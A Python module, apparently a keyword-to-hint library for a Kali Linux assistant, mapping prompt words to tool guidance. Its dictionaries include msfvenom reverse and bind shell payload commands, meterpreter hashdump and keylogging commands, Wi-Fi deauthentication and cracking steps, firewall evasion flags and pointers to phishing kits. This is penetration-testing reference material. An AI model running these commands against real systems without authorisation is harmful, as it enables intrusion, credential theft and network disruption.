#!/usr/bin/env python3
# PAW Context Library
# Provides contextual information about Kali Linux tools based on keywords in prompts

import re
from typing import Dict, List, Set, Optional

# Tool dictionary with contextual information
TOOL_CONTEXTS = {
    # Network scanning and enumeration
    "scan": "Consider using nmap for network scanning. Options: -sS (SYN scan), -sV (version detection), -sC (default scripts), -p- (all ports), -A (aggressive scan with OS detection).",
    "port scan": "Use nmap for port scanning. For quick scans: nmap -F (fast), for stealth: -sS, for comprehensive: -sV -sC -p-",
    "network scan": "Use nmap for network scanning or netdiscover for ARP-based discovery.",
    "discover hosts": "Use netdiscover, nmap with -sn flag, or arp-scan for host discovery on a network.",
    "enumerate": "Consider tools like enum4linux for Windows/Samba, nikto for web servers, or nmap scripts with --script=vuln.",
    "open ports": "Use nmap or masscan for finding open ports. nmap is more feature-rich, while masscan is faster for large networks.",
    
    # Nmap specific options
    "nmap": "Network mapper tool. Key options: -sS (SYN scan), -sT (TCP connect), -sU (UDP), -sV (version detection), -O (OS detection), -A (aggressive), -p (ports), -T(0-5) (timing), --script (NSE scripts).",
    "os detection": "Use nmap with -O for operating system detection. For better results, combine with -sV or -A flags.",
    "service detection": "For service/version detection use nmap -sV. Add --version-intensity (0-9) to control intensity, -sV --version-all for maximum detection.",
    "firewall": "Nmap firewall evasion: -f (fragment packets), --mtu (specify MTU), -D (decoy scan), --source-port (specify source port), --data-length (add random data).",
    "nmap timing": "Control nmap speed with -T(0-5): -T0 (paranoid), -T1 (sneaky), -T2 (polite), -T3 (normal), -T4 (aggressive), -T5 (insane).",
    "script scan": "Use nmap with --script flag. Common categories: default, discovery, safe, vuln, exploit, auth, brute. Example: --script=vuln",
    "vulnerability scan": "Run nmap with --script=vuln to check for known vulnerabilities, or -A for a comprehensive scan including vulnerabilities.",
    
    # Metasploit specific
    "metasploit": "Exploitation framework. Use 'msfconsole' to start. Key commands: search (find modules), use (select module), set/unset (configure options), exploit/run (execute), sessions (manage targets).",
    "msfvenom": "Use msfvenom to create payloads. Syntax: msfvenom -p [payload] LHOST=[IP] LPORT=[port] -f [format]. Common formats: exe, elf, raw, python, ruby, perl, dll.",
    "reverse shell": "Generate reverse shells using msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your IP] LPORT=[port] -f exe > shell.exe",
    "bind shell": "Create bind shells with msfvenom: msfvenom -p windows/meterpreter/bind_tcp RHOST=[target] LPORT=[port] -f exe > shell.exe",
    "meterpreter": "Advanced payload in Metasploit. Commands: sysinfo, getuid, getsystem, ps, migrate, hashdump, search, download, upload, shell, webcam_snap, keyscan_start.",
    "msf database": "Use 'msfdb init' to setup the database. In msfconsole, use 'db_nmap' to save scan results directly to the database. Use 'hosts' and 'services' to view data.",
    "brute force metasploit": "Use auxiliary modules like: use auxiliary/scanner/ssh/ssh_login, set RHOSTS, set USERNAME, set PASS_FILE, set THREADS, run.",
    "metasploit listeners": "Set up a listener: use multi/handler, set PAYLOAD, set LHOST/LPORT, exploit -j (run as job).",
    "metasploit sessions": "Manage sessions with: sessions -l (list), sessions -i [id] (interact), sessions -u [id] (upgrade to meterpreter), sessions -k [id] (kill).",
    "staged payload": "Staged payloads (windows/meterpreter/reverse_tcp) are smaller but need handler. Stageless (windows/meterpreter_reverse_tcp) are larger but more reliable.",
    
    # Wireless testing
    "wifi": "Consider using aircrack-ng suite, particularly airmon-ng, airodump-ng, and aireplay-ng for WiFi testing.",
    "wireless": "Use aircrack-ng suite for wireless network testing or wifite for automated wireless auditing.",
    "bluetooth": "Consider using tools like bluez, btscanner, or bluesnarfer for Bluetooth scanning and testing.",
    "deauth": "Use aireplay-ng with the -0 option for deauthentication attacks.",
    "wpa": "Use aircrack-ng suite, specifically airmon-ng, airodump-ng, and aircrack-ng for WPA handshake capture and cracking.",
    
    # Aircrack-ng suite detailed options
    "aircrack-ng": "WiFi password cracking tool. Syntax: aircrack-ng [options] <capture file(s)>. Common options: -a (force attack mode), -b (BSSID), -w (wordlist), -e (ESSID).",
    "airmon-ng": "Tool to manage wireless interfaces. Commands: airmon-ng (list interfaces), airmon-ng check kill (kill interfering processes), airmon-ng start wlan0 (start monitor mode), airmon-ng stop wlan0mon (stop monitor mode).",
    "airodump-ng": "Wireless packet capture tool. Syntax: airodump-ng [options] interface. Key options: --bssid (target AP), --channel (set channel), -w (write capture), --output-format (cap/csv/kismet/etc), --essid (target network name).",
    "aireplay-ng": "Packet injection tool. Common attacks: -0 (deauth), -1 (fake auth), -2 (interactive packet replay), -3 (ARP request replay). Syntax: aireplay-ng -0 10 -a [BSSID] -c [clientMAC] wlan0mon",
    "monitor mode": "To enable monitor mode: airmon-ng check kill, then airmon-ng start wlan0. Interface typically becomes wlan0mon.",
    "wps attack": "For WPS attacks, use tools like reaver or bully. Example: reaver -i wlan0mon -b [BSSID] -vv",
    "wifi capture": "To capture handshakes: airodump-ng -c [channel] --bssid [BSSID] -w [filename] wlan0mon, then in another terminal: aireplay-ng -0 10 -a [BSSID] -c [clientMAC] wlan0mon",
    "pmkid attack": "For PMKID attacks: hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1",
    "handshake": "To verify a capture contains a handshake: aircrack-ng -J [outfile] [capturefile], or use wireshark to inspect the capture.",
    "wep crack": "For WEP cracking: airodump-ng -c [channel] --bssid [BSSID] -w [file] wlan0mon, then aireplay-ng -1 0 -e [ESSID] -a [BSSID] -h [yourMAC] wlan0mon, followed by aireplay-ng -3 -b [BSSID] -h [yourMAC] wlan0mon.",
    "wifi analysis": "For general WiFi analysis, use airodump-ng wlan0mon. For a more user-friendly tool, try kismet.",
    "airodump filters": "Filter airodump-ng captures with: --essid (network name), --bssid (AP MAC), --channel (specific channel), --encrypt (encryption type: WEP, WPA, OPN).",
    
    # MAC address manipulation
    "mac changer": "Use macchanger to spoof/modify MAC addresses. Syntax: macchanger [options] interface. Common options: -r (random MAC), -A (random vendor MAC), -e (keep vendor bytes), -m XX:XX:XX:XX:XX:XX (specific MAC).",
    "macchanger": "MAC address manipulation tool. First disable the interface: ifconfig eth0 down, then use macchanger -r eth0 (random MAC) or macchanger -m 00:11:22:33:44:55 eth0 (specific MAC), then ifconfig eth0 up to reactivate.",
    "change mac": "To change MAC address: (1) ifconfig interface down (2) macchanger -r interface (random) or macchanger -m XX:XX:XX:XX:XX:XX interface (specific) (3) ifconfig interface up",
    "spoof mac": "To spoof MAC address use macchanger. Disable interface first with ifconfig wlan0 down, then macchanger -r wlan0 for random MAC or macchanger -A wlan0 for random vendor MAC. Re-enable with ifconfig wlan0 up.",
    "fake mac": "Use macchanger to set fake MAC. First ifconfig eth0 down, then macchanger -r eth0 (random) or -a (same kind) or -A (any vendor) or -m 00:11:22:33:44:55 (specific), then ifconfig eth0 up.",
    "mac address": "View current MAC: macchanger -s interface. Change MAC: (1) ifconfig interface down (2) macchanger -r/-a/-m interface (3) ifconfig interface up.",
    "vendor mac": "List vendor MACs with: macchanger -l. Change to random vendor MAC: macchanger -a interface (same kind of device) or macchanger -A interface (any vendor).",
    "permanent mac": "To reset to original hardware MAC: ifconfig interface down, then macchanger -p interface, then ifconfig interface up.",
    "random mac": "For random MAC: ifconfig interface down, macchanger -r interface, ifconfig interface up. For random vendor MAC: macchanger -A interface.",
    
    # Web application testing
    "web scan": "Consider using nikto for web server scanning or dirb/dirbuster/gobuster for directory discovery.",
    "directory scan": "Use dirb, dirbuster, gobuster, or wfuzz for web directory and file discovery/brute-forcing.",
    "website": "Consider tools like nikto, dirbuster, or sqlmap depending on the specific website testing needs.",
    "sql injection": "Use sqlmap for automated SQL injection detection and exploitation.",
    "xss": "Use XSSer or XSStrike for cross-site scripting vulnerability scanning and exploitation.",
    
    # Password attacks
    "password": "Consider tools like hydra for online password attacks or john/hashcat for offline password cracking.",
    "crack": "Use john (John the Ripper) or hashcat for password cracking. hashcat is generally faster for GPU-accelerated attacks.",
    "brute force": "Use hydra for online service brute forcing or john/hashcat for offline password attacks.",
    "dictionary attack": "Use tools like hydra with a wordlist for online attacks or john/hashcat for offline attacks.",
    "wordlist": "Consider using built-in wordlists in /usr/share/wordlists or tools like crunch to generate custom wordlists.",
    
    # Exploitation
    "exploit": "Consider using Metasploit Framework (msfconsole) for exploitation.",
    "payload": "Generate payloads using msfvenom from the Metasploit Framework.",
    "backdoor": "Consider using msfvenom for payload generation or the persistence modules in Metasploit.",
    
    # Sniffing & MITM
    "capture": "Use tcpdump or Wireshark for packet capture and analysis.",
    "sniff": "Use Wireshark or tcpdump for packet sniffing, or specialized tools like ettercap for MITM attacks.",
    "mitm": "Consider ettercap or bettercap for Man-in-the-Middle attacks.",
    "arp spoof": "Use arpspoof from dsniff package or ettercap for ARP spoofing attacks.",
    "packet": "Use tcpdump or Wireshark for packet capture and analysis.",
    
    # Social Engineering
    "phishing": "Consider using Social Engineering Toolkit (SET) or GoPhish for phishing campaigns.",
    "social engineering": "Use the Social Engineering Toolkit (SET) with various attack vectors.",
    
    # Forensics
    "forensic": "Consider tools like Autopsy, dd, or testdisk depending on the forensic task.",
    "recover": "Use tools like testdisk, photorec, or foremost for file recovery.",
    "memory dump": "Use Volatility for memory forensics and analysis.",
    "analyze": "Consider tools specific to what needs to be analyzed - Wireshark for packets, binwalk for binaries, etc.",
    
    # Steganography
    "steg": "Consider tools like steghide, outguess, or stegdetect for steganography.",
    "hide": "Use steghide for hiding data in images or audio files.",
    "extract": "Use binwalk for extracting embedded files or steghide for extracting hidden data from stego files.",
    
    # Information gathering
    "recon": "Consider tools like whois, dmitry, theHarvester, or recon-ng for reconnaissance.",
    "dns": "Use tools like dig, nslookup, dnsenum, or fierce for DNS enumeration.",
    "whois": "Use whois command for domain registration information.",
    "footprint": "Consider tools like dmitry, recon-ng, or osint-framework for footprinting.",
    
    # Post-exploitation
    "privilege escalation": "Use tools like LinPEAS, WinPEAS, or unix-privesc-check for privilege escalation.",
    "post exploitation": "Consider using Metasploit post modules or PowerSploit for post-exploitation.",
    "lateral movement": "Consider using tools like proxychains, port forwarding techniques, or Pass-the-Hash attacks.",
    
    # Anonymity and privacy
    "anonymous": "Consider using tools like Tor, proxychains, or anonsurf for anonymity.",
    "tor": "Use Tor Browser or proxychains with tor for anonymous browsing/connections.",
    "vpn": "Set up OpenVPN or similar VPN services for encrypted communications.",
    
    # Mobile testing
    "android": "Consider using tools like adb, apktool, or drozer for Android application testing.",
    "ios": "Use tools specific to iOS testing depending on the specific task.",
    
    # Reporting
    "report": "Consider tools like dradis, faraday, or simple templates with markdown or LaTeX for reporting.",
    "document": "Use tools like dradis for collaborative documentation or standard office tools with templates.",
    
    # Other specialized tasks
    "fuzz": "Consider tools like wfuzz, ffuf, or AFL for fuzzing applications.",
    "reverse engineer": "Use tools like Ghidra, radare2, or IDA Pro for reverse engineering.",
    "disassemble": "Use Ghidra, radare2, or objdump for disassembling binaries.",
}

# Groups for tool categories 
TOOL_CATEGORIES = {
    "scanning": ["nmap", "masscan", "netdiscover", "arp-scan"],
    "web": ["nikto", "dirb", "dirbuster", "gobuster", "wfuzz", "sqlmap", "burpsuite", "owasp zap"],
    "wireless": ["aircrack-ng", "wifite", "kismet", "reaver", "bully"],
    "password": ["hydra", "john", "hashcat", "crunch", "medusa"],
    "exploitation": ["metasploit", "msfconsole", "msfvenom", "exploit-db", "searchsploit"],
    "sniffing": ["wireshark", "tcpdump", "ettercap", "bettercap", "tshark"],
    "forensics": ["autopsy", "volatility", "binwalk", "foremost", "testdisk", "photorec"],
    "information": ["whois", "recon-ng", "theharvester", "dnsenum", "fierce", "dmitry"],
    "anonymity": ["tor", "proxychains", "anonsurf", "macchanger"],
}

def get_context_for_prompt(prompt: str, previous_output: Optional[str] = None) -> Optional[str]:
    """
    Analyze the prompt and return relevant context about Kali Linux tools.
    
    Args:
        prompt: The user's natural language prompt
        previous_output: Optional output from a previous command to provide context
        
    Returns:
        String with contextual information about relevant tools, or None if no matches
    """
    # Convert prompt to lowercase for case-insensitive matching
    prompt_lower = prompt.lower()
    
    # Find matching contexts
    contexts = []
    
    # Check for exact phrases (multi-word keys)
    for key, context in sorted(TOOL_CONTEXTS.items(), key=lambda x: len(x[0]), reverse=True):
        if len(key.split()) > 1 and key.lower() in prompt_lower:
            contexts.append(context)
    
    # Check for individual keywords
    for key, context in TOOL_CONTEXTS.items():
        # Skip multi-word keys (already checked)
        if len(key.split()) > 1:
            continue
            
        # Match on word boundaries to avoid partial matches
        if re.search(r'\b' + re.escape(key.lower()) + r'\b', prompt_lower):
            contexts.append(context)
    
    # Handle specific tool mentions - add detailed info if a specific tool is mentioned
    tool_info = {}
    for tool in _extract_specific_tools(prompt_lower):
        info = _get_tool_specific_info(tool)
        if info:
            tool_info[tool] = info
    
    # Combine contexts, removing duplicates while preserving order
    unique_contexts = []
    for context in contexts:
        if context not in unique_contexts:
            unique_contexts.append(context)
    
    # Add tool-specific information
    for tool, info in tool_info.items():
        unique_contexts.append(f"Tool '{tool}': {info}")
    
    # Add context based on previous output if provided
    if previous_output:
        prev_context = _analyze_previous_output(previous_output, prompt_lower)
        if prev_context:
            unique_contexts.append(f"Based on previous output: {prev_context}")
    
    # Return combined context or None if empty
    if unique_contexts:
        return " ".join(unique_contexts)
    return None

def _analyze_previous_output(output: str, current_prompt: str) -> Optional[str]:
    """
    Analyze previous command output to provide additional context for current prompt.
    
    Args:
        output: Output from a previous command
        current_prompt: Current user prompt in lowercase
        
    Returns:
        String with contextual information derived from previous output, or None
    """
    context = None
    
    # Check for MAC addresses in the output
    if "mac" in current_prompt or "macchanger" in current_prompt:
        mac_matches = re.findall(r'([0-9A-F]{2}(?::[0-9A-F]{2}){5})', output, re.IGNORECASE)
        if mac_matches:
            context = f"Found MAC address(es) in previous output: {', '.join(mac_matches[:3])}"
            if len(mac_matches) > 3:
                context += f" and {len(mac_matches) - 3} more"
    
    # Check for IP addresses in the output 
    if "ip" in current_prompt or "network" in current_prompt or "scan" in current_prompt:
        ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', output)
        if ip_matches:
            context = f"Found IP address(es) in previous output: {', '.join(ip_matches[:3])}"
            if len(ip_matches) > 3:
                context += f" and {len(ip_matches) - 3} more"
    
    # Check for wireless networks in airodump-ng style output
    if "wifi" in current_prompt or "wireless" in current_prompt or "airodump" in current_prompt:
        bssid_matches = re.findall(r'([0-9A-F]{2}(?::[0-9A-F]{2}){5})\s+', output, re.IGNORECASE)
        if bssid_matches:
            context = f"Found wireless networks in previous output with BSSIDs: {', '.join(bssid_matches[:3])}"
            if len(bssid_matches) > 3:
                context += f" and {len(bssid_matches) - 3} more"
    
    # Check for open ports in nmap-style output
    if "port" in current_prompt or "nmap" in current_prompt or "service" in current_prompt:
        port_matches = re.findall(r'(\d+)\/(?:tcp|udp)\s+open', output, re.IGNORECASE)
        if port_matches:
            context = f"Found open port(s) in previous output: {', '.join(port_matches[:5])}"
            if len(port_matches) > 5:
                context += f" and {len(port_matches) - 5} more"
    
    return context

def _extract_specific_tools(prompt_lower: str) -> List[str]:
    """Extract specific tool names mentioned in the prompt."""
    tools = []
    
    # Common Kali tools to check for explicit mentions
    common_tools = [
        "nmap", "metasploit", "aircrack-ng", "hydra", "hashcat", "john", 
        "wireshark", "sqlmap", "burpsuite", "nikto", "gobuster", "dirb",
        "wfuzz", "recon-ng", "maltego", "ettercap", "netcat", "responder",
        "mimikatz", "volatility", "autopsy", "binwalk", "ghidra", "radare2",
        "airmon-ng", "airodump-ng", "aireplay-ng", "msfvenom", "msfconsole",
        "macchanger"
    ]
    
    for tool in common_tools:
        if tool in prompt_lower:
            tools.append(tool)
    
    return tools

def _get_tool_specific_info(tool: str) -> Optional[str]:
    """Get detailed information about a specific tool."""
    tool_info = {
        "nmap": "Network scanner. Common flags: -sS (SYN scan), -sV (version detection), -sC (scripts), -A (aggressive), -p (port specification), -O (OS detection), -T(0-5) (timing).",
        "metasploit": "Exploitation framework. Start with 'msfconsole'. Key commands: search (find modules), use (select module), set (configure options), run/exploit (execute module), sessions (manage targets), back (return to main).",
        "msfconsole": "Metasploit console. Start with search [term] to find modules, use [path] to select a module, show options to view required settings, set RHOSTS/LHOST/etc., and run or exploit to execute.",
        "msfvenom": "Payload generator. Syntax: msfvenom -p [payload] LHOST=[your IP] LPORT=[port] -f [format] -o [output]. Common formats: exe, elf, raw, python, php.",
        "aircrack-ng": "WiFi password cracking suite. Main tools: airmon-ng (manage monitor mode), airodump-ng (capture packets), aireplay-ng (packet injection), aircrack-ng (crack passwords).",
        "airmon-ng": "Monitor mode tool. Usage: airmon-ng check kill (stop interfering processes), airmon-ng start wlan0 (enable monitor mode), airmon-ng stop wlan0mon (disable monitor mode).",
        "airodump-ng": "WiFi scanner and packet capture. Usage: airodump-ng wlan0mon (scan all networks), airodump-ng -c [channel] --bssid [MAC] -w [file] wlan0mon (target specific AP).",
        "aireplay-ng": "Wireless packet injection. Common uses: aireplay-ng -0 10 -a [BSSID] -c [client] wlan0mon (deauth attack), aireplay-ng -1 0 -e [ESSID] -a [BSSID] -h [MAC] wlan0mon (fake auth).",
        "macchanger": "MAC address spoofing tool. Usage: 1) ifconfig interface down 2) macchanger [option] interface 3) ifconfig interface up. Options: -r (random MAC), -a (same vendor type), -A (random vendor), -p (restore original), -m XX:XX:XX:XX:XX:XX (specific MAC).",
        "hydra": "Login brute-forcer. Syntax: hydra -l [user] -P [wordlist] [service://server] [options].",
        "hashcat": "Fast password cracker. Syntax: hashcat -m [hash type] -a [attack mode] [hash file] [wordlist].",
        "john": "Password cracker. Basic usage: 'john --wordlist=[path] [hash file]'. Use --format to specify hash type.",
        "wireshark": "Packet analyzer with GUI. For terminal, use 'tshark'.",
        "sqlmap": "SQL injection scanner. Basic usage: 'sqlmap -u [URL] --dbs' to find databases.",
        "burpsuite": "Web application security testing. Use proxy on 127.0.0.1:8080 by default.",
        "nikto": "Web server scanner. Basic usage: 'nikto -h [host]'.",
        "gobuster": "Directory brute-forcer. Syntax: gobuster dir -u [URL] -w [wordlist].",
        "dirb": "URL brute-forcer. Basic usage: 'dirb [URL] [wordlist]'.",
        "wfuzz": "Web fuzzer. Can fuzz multiple parameters with various encodings.",
        "recon-ng": "Reconnaissance framework. Use 'marketplace search' to find modules.",
        "maltego": "Data mining tool for relationships. Has graphical interface.",
        "ettercap": "MITM framework. Graphical with 'ettercap -G' or text with various options.",
    }
    
    return tool_info.get(tool)

if __name__ == "__main__":
    # Test the context generation
    test_prompts = [
        "Scan the network for open ports",
        "Find all WordPress vulnerabilities on a website",
        "Crack a WPA password from a capture file",
        "Set up a phishing campaign",
        "Brute force SSH login",
        "Change my MAC address using macchanger"
    ]
    
    for prompt in test_prompts:
        print(f"Prompt: {prompt}")
        context = get_context_for_prompt(prompt)
        print(f"Context: {context}\n") 